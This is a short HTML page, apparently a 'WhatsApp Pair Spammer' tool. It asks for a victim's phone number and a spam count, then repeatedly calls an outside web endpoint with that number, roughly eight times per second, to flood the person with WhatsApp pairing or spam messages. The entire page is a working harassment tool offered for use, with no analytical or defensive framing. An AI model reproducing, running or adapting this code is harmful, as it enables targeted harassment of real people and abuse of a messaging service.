<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>WhatsApp Pair Spammer</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #111;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
    }

    .box {
      background: #222;
      padding: 20px;
      border-radius: 10px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 10px #000;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      font-size: 16px;
      border: none;
      border-radius: 5px;
    }

    button {
      width: 100%;
      padding: 12px;
      font-size: 16px;
      background-color: #00c853;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    button:hover {
      background-color: #00e676;
    }

    #log {
      margin-top: 20px;
      max-height: 300px;
      overflow-y: auto;
      background: #1b1b1b;
      padding: 10px;
      border-radius: 5px;
      font-family: monospace;
      font-size: 14px;
    }

    .log-line {
      margin: 4px 0;
      color: #9be7ff;
    }
  </style>
</head>
<body>
  <div class="box">
    <h2>WhatsApp Spam Sender</h2>
    <input type="text" id="number" placeholder="Enter WhatsApp number e.g. +9476XXXXXXX" />
    <input type="number" id="count" placeholder="Enter Spam Count e.g. 20" />
    <button id="send">Send</button>
    <div id="log"></div>
  </div>

  <script>
    const sendBtn = document.getElementById("send");
    const logDiv = document.getElementById("log");

    sendBtn.addEventListener("click", async () => {
      const number = document.getElementById("number").value.trim();
      const count = parseInt(document.getElementById("count").value.trim());

      if (!number || number.length < 10 || isNaN(count) || count < 1) {
        alert("Please enter valid number and spam count.");
        return;
      }

      logDiv.innerHTML = "";

      let sent = 0;

      const spam = async () => {
        if (sent >= count) return;
        try {
          await fetch(`https://asitha.top/anunge-reddawal-hoyanna-epa-utto-awajathaka-ponnayek-wenna-epa/?num=${number.replace(/\D/g, '')}`);
          const line = document.createElement("div");
          line.className = "log-line";
          line.textContent = `spam sent by: ${number}`;
          logDiv.appendChild(line);
          logDiv.scrollTop = logDiv.scrollHeight;
        } catch (e) {
          console.error("Failed to send");
        }
        sent++;
        setTimeout(spam, 125); // ~8 per second
      };

      spam();
    });
  </script>
</body>
</html>
